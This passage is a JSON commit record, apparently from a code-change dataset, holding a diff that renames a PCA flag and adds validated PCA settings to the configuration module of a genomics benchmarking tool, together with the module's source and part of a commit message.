benchmark.'.format(test_operation_name))\n+        else:\n+            self.fail(msg='Resulting psv file could not be found.')\n+\n+        # Remove the test data directory from any previous unit tests\n+        if os.path.isdir(test_dir):\n+            shutil.rmtree(test_dir)\n+\n+        # Remove the PSV file from this unit test\n+        if os.path.isfile(psv_file):\n+            os.remove(psv_file)\n+\n \n if __name__ == \"__main__\":\n     unittest.main()\n", "message": "", "files": {"/genomics_benchmarks/config.py": {"changes": [{"diff": "\n     benchmark_data_input = \"vcf\"\n     benchmark_dataset = \"\"\n     benchmark_aggregations = False\n-    benchmark_PCA = False\n+    benchmark_pca = False\n     vcf_to_zarr_config = None\n \n+    # PCA-specific settings\n+    pca_number_components = 10\n+    pca_data_scaler = benchmark_pca_data_scaler_types[PCA_DATA_SCALER_PATTERSON]\n+    pca_genotype_array_type = GENOTYPE_ARRAY_DASK\n+    pca_subset_size = 100000\n+    pca_ld_pruning_number_iterations = 2\n+    pca_ld_pruning_size = 100\n+    pca_ld_pruning_step = 20\n+    pca_ld_pruning_threshold = 0.01\n+\n     def __init__(self, runtime_config=None):\n         \"\"\"\n         Creates an object representation of the Benchmark module's configuration data.\n", "add": 11, "remove": 1, "filename": "/genomics_benchmarks/config.py", "badparts": ["    benchmark_PCA = False"], "goodparts": ["    benchmark_pca = False", "    pca_number_components = 10", "    pca_data_scaler = benchmark_pca_data_scaler_types[PCA_DATA_SCALER_PATTERSON]", "    pca_genotype_array_type = GENOTYPE_ARRAY_DASK", "    pca_subset_size = 100000", "    pca_ld_pruning_number_iterations = 2", "    pca_ld_pruning_size = 100", "    pca_ld_pruning_step = 20", "    pca_ld_pruning_threshold = 0.01"]}, {"diff": "\n                     self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n                 if \"benchmark_aggregations\" in runtime_config.benchmark:\n                     self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])\n-                if \"benchmark_PCA\" in runtime_config.benchmark:\n-                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n+                if \"benchmark_pca\" in runtime_config.benchmark:\n+                    self.benchmark_pca = config_str_to_bool(runtime_config.benchmark[\"benchmark_pca\"])\n+                if \"pca_number_components\" in runtime_config.benchmark:\n+                    pca_number_components_str = runtime_config.benchmark[\"pca_number_components\"]\n+                    if isint(pca_number_components_str) and (int(pca_number_components_str) > 0):\n+                        self.pca_number_components = int(pca_number_components_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_number_components in configuration.\\n\"\n+                                         \"pca_number_components must be a valid integer greater than 0.\")\n+                if \"pca_data_scaler\" in runtime_config.benchmark:\n+                    pca_data_scaler_str = runtime_config.benchmark[\"pca_data_scaler\"]\n+                    if isint(pca_data_scaler_str) and (int(pca_data_scaler_str) in benchmark_pca_data_scaler_types):\n+                        self.pca_data_scaler = benchmark_pca_data_scaler_types[int(pca_data_scaler_str)]\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_data_scaler in configuration.\\n\"\n+                                         \"pca_data_scaler must be a valid integer between 0 and 2\")\n+                if \"pca_genotype_array_type\" in runtime_config.benchmark:\n+                    pca_genotype_array_type_str = runtime_config.benchmark[\"pca_genotype_array_type\"]\n+                    if isint(pca_genotype_array_type_str) and (\n+                            int(pca_genotype_array_type_str) in benchmark_pca_genotype_array_types):\n+                        self.pca_genotype_array_type = int(pca_genotype_array_type_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_genotype_array_type in configuration.\\n\"\n+                                         \"pca_genotype_array_type must be a valid integer between 0 and 2\")\n+                if \"pca_subset_size\" in runtime_config.benchmark:\n+                    pca_subset_size_str = runtime_config.benchmark[\"pca_subset_size\"]\n+                    if isint(pca_subset_size_str) and (int(pca_subset_size_str) > 0):\n+                        self.pca_subset_size = int(pca_subset_size_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_subset_size in configuration.\\n\"\n+                                         \"pca_subset_size must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_number_iterations\" in runtime_config.benchmark:\n+                    pca_ld_pruning_number_iterations_str = runtime_config.benchmark[\"pca_ld_pruning_number_iterations\"]\n+                    if isint(pca_ld_pruning_number_iterations_str) and (int(pca_ld_pruning_number_iterations_str) > 0):\n+                        self.pca_ld_pruning_number_iterations = int(pca_ld_pruning_number_iterations_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_number_iterations in configuration.\\n\"\n+                                         \"pca_ld_pruning_number_iterations must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_size\" in runtime_config.benchmark:\n+                    pca_ld_pruning_size_str = runtime_config.benchmark[\"pca_ld_pruning_size\"]\n+                    if isint(pca_ld_pruning_size_str) and (int(pca_ld_pruning_size_str) > 0):\n+                        self.pca_ld_pruning_size = int(pca_ld_pruning_size_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_size in configuration.\\n\"\n+                                         \"pca_ld_pruning_size must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_step\" in runtime_config.benchmark:\n+                    pca_ld_pruning_step_str = runtime_config.benchmark[\"pca_ld_pruning_step\"]\n+                    if isint(pca_ld_pruning_step_str) and (int(pca_ld_pruning_step_str) > 0):\n+                        self.pca_ld_pruning_step = int(pca_ld_pruning_step_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_step in configuration.\\n\"\n+                                         \"pca_ld_pruning_step must be a valid integer greater than 0.\")\n+                if \"pca_ld_pruning_threshold\" in runtime_config.benchmark:\n+                    pca_ld_pruning_threshold_str = runtime_config.benchmark[\"pca_ld_pruning_threshold\"]\n+                    if isfloat(pca_ld_pruning_threshold_str) and (float(pca_ld_pruning_threshold_str) > 0):\n+                        self.pca_ld_pruning_threshold = float(pca_ld_pruning_threshold_str)\n+                    else:\n+                        raise ValueError(\"Invalid value for pca_ld_pruning_threshold in configuration.\\n\"\n+                                         \"pca_ld_pruning_threshold must be a valid float greater than 0.\")\n \n             # Add the VCF to Zarr Conversion Configuration Data\n             self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)", "add": 59, "remove": 2, "filename": "/genomics_benchmarks/config.py", "badparts": ["                if \"benchmark_PCA\" in runtime_config.benchmark:", "                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])"], "goodparts": ["                if \"benchmark_pca\" in runtime_config.benchmark:", "                    self.benchmark_pca = config_str_to_bool(runtime_config.benchmark[\"benchmark_pca\"])", "                if \"pca_number_components\" in runtime_config.benchmark:", "                    pca_number_components_str = runtime_config.benchmark[\"pca_number_components\"]", "                    if isint(pca_number_components_str) and (int(pca_number_components_str) > 0):", "                        self.pca_number_components = int(pca_number_components_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_number_components in configuration.\\n\"", "                                         \"pca_number_components must be a valid integer greater than 0.\")", "                if \"pca_data_scaler\" in runtime_config.benchmark:", "                    pca_data_scaler_str = runtime_config.benchmark[\"pca_data_scaler\"]", "                    if isint(pca_data_scaler_str) and (int(pca_data_scaler_str) in benchmark_pca_data_scaler_types):", "                        self.pca_data_scaler = benchmark_pca_data_scaler_types[int(pca_data_scaler_str)]", "                    else:", "                        raise ValueError(\"Invalid value for pca_data_scaler in configuration.\\n\"", "                                         \"pca_data_scaler must be a valid integer between 0 and 2\")", "                if \"pca_genotype_array_type\" in runtime_config.benchmark:", "                    pca_genotype_array_type_str = runtime_config.benchmark[\"pca_genotype_array_type\"]", "                    if isint(pca_genotype_array_type_str) and (", "                            int(pca_genotype_array_type_str) in benchmark_pca_genotype_array_types):", "                        self.pca_genotype_array_type = int(pca_genotype_array_type_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_genotype_array_type in configuration.\\n\"", "                                         \"pca_genotype_array_type must be a valid integer between 0 and 2\")", "                if \"pca_subset_size\" in runtime_config.benchmark:", "                    pca_subset_size_str = runtime_config.benchmark[\"pca_subset_size\"]", "                    if isint(pca_subset_size_str) and (int(pca_subset_size_str) > 0):", "                        self.pca_subset_size = int(pca_subset_size_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_subset_size in configuration.\\n\"", "                                         \"pca_subset_size must be a valid integer greater than 0.\")", "                if \"pca_ld_pruning_number_iterations\" in runtime_config.benchmark:", "                    pca_ld_pruning_number_iterations_str = runtime_config.benchmark[\"pca_ld_pruning_number_iterations\"]", "                    if isint(pca_ld_pruning_number_iterations_str) and (int(pca_ld_pruning_number_iterations_str) > 0):", "                        self.pca_ld_pruning_number_iterations = int(pca_ld_pruning_number_iterations_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_ld_pruning_number_iterations in configuration.\\n\"", "                                         \"pca_ld_pruning_number_iterations must be a valid integer greater than 0.\")", "                if \"pca_ld_pruning_size\" in runtime_config.benchmark:", "                    pca_ld_pruning_size_str = runtime_config.benchmark[\"pca_ld_pruning_size\"]", "                    if isint(pca_ld_pruning_size_str) and (int(pca_ld_pruning_size_str) > 0):", "                        self.pca_ld_pruning_size = int(pca_ld_pruning_size_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_ld_pruning_size in configuration.\\n\"", "                                         \"pca_ld_pruning_size must be a valid integer greater than 0.\")", "                if \"pca_ld_pruning_step\" in runtime_config.benchmark:", "                    pca_ld_pruning_step_str = runtime_config.benchmark[\"pca_ld_pruning_step\"]", "                    if isint(pca_ld_pruning_step_str) and (int(pca_ld_pruning_step_str) > 0):", "                        self.pca_ld_pruning_step = int(pca_ld_pruning_step_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_ld_pruning_step in configuration.\\n\"", "                                         \"pca_ld_pruning_step must be a valid integer greater than 0.\")", "                if \"pca_ld_pruning_threshold\" in runtime_config.benchmark:", "                    pca_ld_pruning_threshold_str = runtime_config.benchmark[\"pca_ld_pruning_threshold\"]", "                    if isfloat(pca_ld_pruning_threshold_str) and (float(pca_ld_pruning_threshold_str) > 0):", "                        self.pca_ld_pruning_threshold = float(pca_ld_pruning_threshold_str)", "                    else:", "                        raise ValueError(\"Invalid value for pca_ld_pruning_threshold in configuration.\\n\"", "                                         \"pca_ld_pruning_threshold must be a valid float greater than 0.\")"]}], "source": "\nfrom configparser import ConfigParser from shutil import copyfile import os.path from pkg_resources import resource_string from numcodecs import Blosc def config_str_to_bool(input_str): \"\"\" :param input_str: The input string to convert to bool value :type input_str: str :return: bool \"\"\" return input_str.lower() in['true', '1', 't', 'y', 'yes'] class DataDirectoriesConfigurationRepresentation: input_dir=\"./data/input/\" download_dir=input_dir +\"download/\" temp_dir=\"./data/temp/\" vcf_dir=\"./data/vcf/\" zarr_dir_setup=\"./data/zarr/\" zarr_dir_benchmark=\"./data/zarr_benchmark/\" def isint(value): try: int(value) return True except ValueError: return False def isfloat(value): try: float(value) return True except ValueError: return False class ConfigurationRepresentation(object): \"\"\" A small utility class for object representation of a standard config. file. \"\"\" def __init__(self, file_name): \"\"\" Initializes the configuration representation with a supplied file. \"\"\" parser=ConfigParser() parser.optionxform=str found=parser.read(file_name) if not found: raise ValueError(\"Configuration file{0} not found\".format(file_name)) for name in parser.sections(): dict_section={name: dict(parser.items(name))} self.__dict__.update(dict_section) class FTPConfigurationRepresentation(object): \"\"\" Utility class for object representation of FTP module configuration. \"\"\" enabled=False server=\"\" username=\"\" password=\"\" use_tls=False directory=\"\" files=[] def __init__(self, runtime_config=None): \"\"\" Creates an object representation of FTP module configuration data. :param runtime_config: runtime_config data to extract FTP settings from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"ftp\"): if \"enabled\" in runtime_config.ftp: self.enabled=config_str_to_bool(runtime_config.ftp[\"enabled\"]) if \"server\" in runtime_config.ftp: self.server=runtime_config.ftp[\"server\"] if \"username\" in runtime_config.ftp: self.username=runtime_config.ftp[\"username\"] if \"password\" in runtime_config.ftp: self.password=runtime_config.ftp[\"password\"] if \"use_tls\" in runtime_config.ftp: self.use_tls=config_str_to_bool(runtime_config.ftp[\"use_tls\"]) if \"directory\" in runtime_config.ftp: self.directory=runtime_config.ftp[\"directory\"] if \"file_delimiter\" in runtime_config.ftp: delimiter=runtime_config.ftp[\"file_delimiter\"] else: delimiter=\"|\" if \"files\" in runtime_config.ftp: files_str=str(runtime_config.ftp[\"files\"]) if files_str==\"*\": self.files=[] else: self.files=files_str.split(delimiter) vcf_to_zarr_compressor_types=[\"Blosc\"] vcf_to_zarr_blosc_algorithm_types=[\"zstd\", \"blosclz\", \"lz4\", \"lz4hc\", \"zlib\", \"snappy\"] vcf_to_zarr_blosc_shuffle_types=[Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE] class VCFtoZarrConfigurationRepresentation: \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\" enabled=False fields=None alt_number=None chunk_length=None chunk_width=None compressor=\"Blosc\" blosc_compression_algorithm=\"zstd\" blosc_compression_level=1 blosc_shuffle_mode=Blosc.AUTOSHUFFLE def __init__(self, runtime_config=None): \"\"\" Creates an object representation of VCF to Zarr Conversion module configuration data. :param runtime_config: runtime_config data to extract conversion configuration from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"vcf_to_zarr\"): if \"enabled\" in runtime_config.vcf_to_zarr: self.enabled=config_str_to_bool(runtime_config.vcf_to_zarr[\"enabled\"]) if \"alt_number\" in runtime_config.vcf_to_zarr: alt_number_str=runtime_config.vcf_to_zarr[\"alt_number\"] if str(alt_number_str).lower()==\"auto\": self.alt_number=None elif isint(alt_number_str): self.alt_number=int(alt_number_str) else: raise TypeError(\"Invalid value provided for alt_number in configuration.\\n\" \"Expected: \\\"auto\\\" or integer value\") if \"chunk_length\" in runtime_config.vcf_to_zarr: chunk_length_str=runtime_config.vcf_to_zarr[\"chunk_length\"] if chunk_length_str==\"default\": self.chunk_length=None elif isint(chunk_length_str): self.chunk_length=int(chunk_length_str) else: raise TypeError(\"Invalid value provided for chunk_length in configuration.\\n\" \"Expected: \\\"default\\\" or integer value\") if \"chunk_width\" in runtime_config.vcf_to_zarr: chunk_width_str=runtime_config.vcf_to_zarr[\"chunk_width\"] if chunk_width_str==\"default\": self.chunk_width=None elif isint(chunk_width_str): self.chunk_width=int(chunk_width_str) else: raise TypeError(\"Invalid value provided for chunk_width in configuration.\\n\" \"Expected: \\\"default\\\" or integer value\") if \"compressor\" in runtime_config.vcf_to_zarr: compressor_temp=runtime_config.vcf_to_zarr[\"compressor\"] if compressor_temp in vcf_to_zarr_compressor_types: self.compressor=compressor_temp if \"blosc_compression_algorithm\" in runtime_config.vcf_to_zarr: blosc_compression_algorithm_temp=runtime_config.vcf_to_zarr[\"blosc_compression_algorithm\"] if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types: self.blosc_compression_algorithm=blosc_compression_algorithm_temp if \"blosc_compression_level\" in runtime_config.vcf_to_zarr: blosc_compression_level_str=runtime_config.vcf_to_zarr[\"blosc_compression_level\"] if isint(blosc_compression_level_str): compression_level_int=int(blosc_compression_level_str) if(compression_level_int >=0) and(compression_level_int <=9): self.blosc_compression_level=compression_level_int else: raise ValueError(\"Invalid value for blosc_compression_level in configuration.\\n\" \"blosc_compression_level must be between 0 and 9.\") else: raise TypeError(\"Invalid value for blosc_compression_level in configuration.\\n\" \"blosc_compression_level could not be converted to integer.\") if \"blosc_shuffle_mode\" in runtime_config.vcf_to_zarr: blosc_shuffle_mode_str=runtime_config.vcf_to_zarr[\"blosc_shuffle_mode\"] if isint(blosc_shuffle_mode_str): blosc_shuffle_mode_int=int(blosc_shuffle_mode_str) if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types: self.blosc_shuffle_mode=blosc_shuffle_mode_int else: raise ValueError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\" \"blosc_shuffle_mode must be a valid integer.\") else: raise TypeError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\" \"blosc_shuffle_mode could not be converted to integer.\") benchmark_data_input_types=[\"vcf\", \"zarr\"] class BenchmarkConfigurationRepresentation: \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\" benchmark_number_runs=5 benchmark_data_input=\"vcf\" benchmark_dataset=\"\" benchmark_aggregations=False benchmark_PCA=False vcf_to_zarr_config=None def __init__(self, runtime_config=None): \"\"\" Creates an object representation of the Benchmark module's configuration data. :param runtime_config: runtime_config data to extract benchmark configuration from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"benchmark\"): if \"benchmark_number_runs\" in runtime_config.benchmark: try: self.benchmark_number_runs=int(runtime_config.benchmark[\"benchmark_number_runs\"]) except ValueError: pass if \"benchmark_data_input\" in runtime_config.benchmark: benchmark_data_input_temp=runtime_config.benchmark[\"benchmark_data_input\"] if benchmark_data_input_temp in benchmark_data_input_types: self.benchmark_data_input=benchmark_data_input_temp if \"benchmark_dataset\" in runtime_config.benchmark: self.benchmark_dataset=runtime_config.benchmark[\"benchmark_dataset\"] if \"benchmark_aggregations\" in runtime_config.benchmark: self.benchmark_aggregations=config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"]) if \"benchmark_PCA\" in runtime_config.benchmark: self.benchmark_PCA=config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"]) self.vcf_to_zarr_config=VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config) def read_configuration(location): \"\"\" Args: location of the configuration file, existing configuration dictionary Returns: a dictionary of the form <dict>.<section>[<option>] and the corresponding values. \"\"\" config=ConfigurationRepresentation(location) return config def generate_default_config_file(output_location, overwrite=False): default_config_file_data=resource_string(__name__, 'config/benchmark.conf.default') if overwrite is None: overwrite=False if output_location is not None: if os.path.exists(output_location) and not overwrite: print( \"[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.\") return with open(output_location, 'wb') as output_file: output_file.write(default_config_file_data) if os.path.exists(output_location): print(\"[Config] Configuration file has been generated successfully.\") else: print(\"[Config] Configuration file was not generated.\") ", "sourceWithComments": "from configparser import ConfigParser\nfrom shutil import copyfile\nimport os.path\nfrom pkg_resources import resource_string\nfrom numcodecs import Blosc\n\n\ndef config_str_to_bool(input_str):\n    \"\"\"\n    :param input_str: The input string to convert to bool value\n    :type input_str: str\n    :return: bool\n    \"\"\"\n    return input_str.lower() in ['true', '1', 't', 'y', 'yes']\n\n\nclass DataDirectoriesConfigurationRepresentation:\n    input_dir = \"./data/input/\"\n    download_dir = input_dir + \"download/\"\n    temp_dir = \"./data/temp/\"\n    vcf_dir = \"./data/vcf/\"\n    zarr_dir_setup = \"./data/zarr/\"\n    zarr_dir_benchmark = \"./data/zarr_benchmark/\"\n\n\ndef isint(value):\n    try:\n        int(value)\n        return True\n    except ValueError:\n        return False\n\n\ndef isfloat(value):\n    try:\n        float(value)\n        return True\n    except ValueError:\n        return False\n\n\nclass ConfigurationRepresentation(object):\n    \"\"\" A small utility class for object representation of a standard config. file. \"\"\"\n\n    def __init__(self, file_name):\n        \"\"\" Initializes the configuration representation with a supplied file. \"\"\"\n        parser = ConfigParser()\n        parser.optionxform = str  # make option names case sensitive\n        found = parser.read(file_name)\n        if not found:\n            raise ValueError(\"Configuration file {0} not found\".format(file_name))\n        for name in parser.sections():\n            dict_section = {name: dict(parser.items(name))}  # create dictionary representation for section\n            self.__dict__.update(dict_section)  # add section dictionary to root dictionary\n\n\nclass FTPConfigurationRepresentation(object):\n    \"\"\" Utility class for object representation of FTP module configuration. \"\"\"\n    enabled = False  # Specifies whether the FTP module should be enabled or not\n    server = \"\"  # FTP server to connect to\n    username = \"\"  # Username to login with. Set username and password to blank for anonymous login\n    password = \"\"  # Password to login with. Set username and password to blank for anonymous login\n    use_tls = False  # Whether the connection should use TLS encryption\n    directory = \"\"  # Directory on FTP server to download files from\n    files = []  # List of files within directory to download. Set to empty list to download all files within directory\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of FTP module configuration data.\n        :param runtime_config: runtime_config data to extract FTP settings from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            # Check if [ftp] section exists in config\n            if hasattr(runtime_config, \"ftp\"):\n                # Extract relevant settings from config file\n                if \"enabled\" in runtime_config.ftp:\n                    self.enabled = config_str_to_bool(runtime_config.ftp[\"enabled\"])\n                if \"server\" in runtime_config.ftp:\n                    self.server = runtime_config.ftp[\"server\"]\n                if \"username\" in runtime_config.ftp:\n                    self.username = runtime_config.ftp[\"username\"]\n                if \"password\" in runtime_config.ftp:\n                    self.password = runtime_config.ftp[\"password\"]\n                if \"use_tls\" in runtime_config.ftp:\n                    self.use_tls = config_str_to_bool(runtime_config.ftp[\"use_tls\"])\n                if \"directory\" in runtime_config.ftp:\n                    self.directory = runtime_config.ftp[\"directory\"]\n\n                # Convert delimited list of files (string) to Python-style list\n                if \"file_delimiter\" in runtime_config.ftp:\n                    delimiter = runtime_config.ftp[\"file_delimiter\"]\n                else:\n                    delimiter = \"|\"\n\n                if \"files\" in runtime_config.ftp:\n                    files_str = str(runtime_config.ftp[\"files\"])\n                    if files_str == \"*\":\n                        self.files = []\n                    else:\n                        self.files = files_str.split(delimiter)\n\n\nvcf_to_zarr_compressor_types = [\"Blosc\"]\nvcf_to_zarr_blosc_algorithm_types = [\"zstd\", \"blosclz\", \"lz4\", \"lz4hc\", \"zlib\", \"snappy\"]\nvcf_to_zarr_blosc_shuffle_types = [Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE]\n\n\nclass VCFtoZarrConfigurationRepresentation:\n    \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\"\n    enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not\n    fields = None\n    alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined\n    chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value\n    chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value\n    compressor = \"Blosc\"  # Specifies compressor type to use for Zarr conversion\n    blosc_compression_algorithm = \"zstd\"\n    blosc_compression_level = 1  # Level of compression to use for Zarr conversion\n    blosc_shuffle_mode = Blosc.AUTOSHUFFLE\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of VCF to Zarr Conversion module configuration data.\n        :param runtime_config: runtime_config data to extract conversion configuration from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            # Check if [vcf_to_zarr] section exists in config\n            if hasattr(runtime_config, \"vcf_to_zarr\"):\n                # Extract relevant settings from config file\n                if \"enabled\" in runtime_config.vcf_to_zarr:\n                    self.enabled = config_str_to_bool(runtime_config.vcf_to_zarr[\"enabled\"])\n                if \"alt_number\" in runtime_config.vcf_to_zarr:\n                    alt_number_str = runtime_config.vcf_to_zarr[\"alt_number\"]\n\n                    if str(alt_number_str).lower() == \"auto\":\n                        self.alt_number = None\n                    elif isint(alt_number_str):\n                        self.alt_number = int(alt_number_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for alt_number in configuration.\\n\"\n                                        \"Expected: \\\"auto\\\" or integer value\")\n                if \"chunk_length\" in runtime_config.vcf_to_zarr:\n                    chunk_length_str = runtime_config.vcf_to_zarr[\"chunk_length\"]\n                    if chunk_length_str == \"default\":\n                        self.chunk_length = None\n                    elif isint(chunk_length_str):\n                        self.chunk_length = int(chunk_length_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for chunk_length in configuration.\\n\"\n                                        \"Expected: \\\"default\\\" or integer value\")\n                if \"chunk_width\" in runtime_config.vcf_to_zarr:\n                    chunk_width_str = runtime_config.vcf_to_zarr[\"chunk_width\"]\n                    if chunk_width_str == \"default\":\n                        self.chunk_width = None\n                    elif isint(chunk_width_str):\n                        self.chunk_width = int(chunk_width_str)\n                    else:\n                        raise TypeError(\"Invalid value provided for chunk_width in configuration.\\n\"\n                                        \"Expected: \\\"default\\\" or integer value\")\n                if \"compressor\" in runtime_config.vcf_to_zarr:\n                    compressor_temp = runtime_config.vcf_to_zarr[\"compressor\"]\n                    # Ensure compressor type specified is valid\n                    if compressor_temp in vcf_to_zarr_compressor_types:\n                        self.compressor = compressor_temp\n                if \"blosc_compression_algorithm\" in runtime_config.vcf_to_zarr:\n                    blosc_compression_algorithm_temp = runtime_config.vcf_to_zarr[\"blosc_compression_algorithm\"]\n                    if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types:\n                        self.blosc_compression_algorithm = blosc_compression_algorithm_temp\n                if \"blosc_compression_level\" in runtime_config.vcf_to_zarr:\n                    blosc_compression_level_str = runtime_config.vcf_to_zarr[\"blosc_compression_level\"]\n                    if isint(blosc_compression_level_str):\n                        compression_level_int = int(blosc_compression_level_str)\n                        if (compression_level_int >= 0) and (compression_level_int <= 9):\n                            self.blosc_compression_level = compression_level_int\n                        else:\n                            raise ValueError(\"Invalid value for blosc_compression_level in configuration.\\n\"\n                                             \"blosc_compression_level must be between 0 and 9.\")\n                    else:\n                        raise TypeError(\"Invalid value for blosc_compression_level in configuration.\\n\"\n                                        \"blosc_compression_level could not be converted to integer.\")\n                if \"blosc_shuffle_mode\" in runtime_config.vcf_to_zarr:\n                    blosc_shuffle_mode_str = runtime_config.vcf_to_zarr[\"blosc_shuffle_mode\"]\n                    if isint(blosc_shuffle_mode_str):\n                        blosc_shuffle_mode_int = int(blosc_shuffle_mode_str)\n                        if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types:\n                            self.blosc_shuffle_mode = blosc_shuffle_mode_int\n                        else:\n                            raise ValueError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\"\n                                             \"blosc_shuffle_mode must be a valid integer.\")\n                    else:\n                        raise TypeError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\"\n                                        \"blosc_shuffle_mode could not be converted to integer.\")\n\n\nbenchmark_data_input_types = [\"vcf\", \"zarr\"]\n\n\nclass BenchmarkConfigurationRepresentation:\n    \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\"\n    benchmark_number_runs = 5\n    benchmark_data_input = \"vcf\"\n    benchmark_dataset = \"\"\n    benchmark_aggregations = False\n    benchmark_PCA = False\n    vcf_to_zarr_config = None\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of the Benchmark module's configuration data.\n        :param runtime_config: runtime_config data to extract benchmark configuration from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            if hasattr(runtime_config, \"benchmark\"):\n                # Extract relevant settings from config file\n                if \"benchmark_number_runs\" in runtime_config.benchmark:\n                    try:\n                        self.benchmark_number_runs = int(runtime_config.benchmark[\"benchmark_number_runs\"])\n                    except ValueError:\n                        pass\n                if \"benchmark_data_input\" in runtime_config.benchmark:\n                    benchmark_data_input_temp = runtime_config.benchmark[\"benchmark_data_input\"]\n                    if benchmark_data_input_temp in benchmark_data_input_types:\n                        self.benchmark_data_input = benchmark_data_input_temp\n                if \"benchmark_dataset\" in runtime_config.benchmark:\n                    self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n                if \"benchmark_aggregations\" in runtime_config.benchmark:\n                    self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])\n                if \"benchmark_PCA\" in runtime_config.benchmark:\n                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n\n            # Add the VCF to Zarr Conversion Configuration Data\n            self.vcf_to_zarr_config = VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config)\n\n\ndef read_configuration(location):\n    \"\"\"\n    Args: location of the configuration file, existing configuration dictionary\n    Returns: a dictionary of the form\n    <dict>.<section>[<option>] and the corresponding values.\n    \"\"\"\n    config = ConfigurationRepresentation(location)\n    return config\n\n\ndef generate_default_config_file(output_location, overwrite=False):\n    # Get Default Config File Data as Package Resource\n    default_config_file_data = resource_string(__name__, 'config/benchmark.conf.default')\n\n    if overwrite is None:\n        overwrite = False\n\n    if output_location is not None:\n        # Check if a file currently exists at the location\n        if os.path.exists(output_location) and not overwrite:\n            print(\n                \"[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.\")\n            return\n\n        # Write the default configuration file to specified location\n        with open(output_location, 'wb') as output_file:\n            output_file.write(default_config_file_data)\n\n        # Check whether configuration file now exists and report status\n        if os.path.exists(output_location):\n            print(\"[Config] Configuration file has been generated successfully.\")\n        else:\n            print(\"[Config] Configuration file was not generated.\")\n"}}, "msg": "Implement Benchmark for PCA (#38)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure 